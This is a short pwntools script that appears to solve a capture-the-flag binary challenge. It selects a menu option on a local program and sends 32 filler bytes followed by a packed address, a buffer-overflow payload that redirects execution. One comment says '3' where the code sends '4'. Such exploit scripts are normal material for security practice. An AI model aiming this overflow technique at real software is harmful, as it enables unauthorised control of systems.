from pwn import *

context.log_level = 'debug'

def main():
    # Start the process
    pty = process.PTY

    p = process('./chall', stdin=pty, stdout=pty)

    # Step 1: Send "2" and receive the response
    print(p.recvuntil("Enter your choice: "))
    p.sendline("2")

    # Step 2: Send some data and receive the response
    #print(p.recvuntil("Data for buffer: "))
    payload = b'A' * 32
    payload += p64(0x4011a0)
    print(payload) 
    p.sendline(payload)

    # Step 3: Send "3" and receive the response
    print(p.recvuntil("Enter your choice: "))
    p.sendline("4")


    # Receive and print any remaining output
    print(p.recvall())


if __name__ == '__main__':
    main()
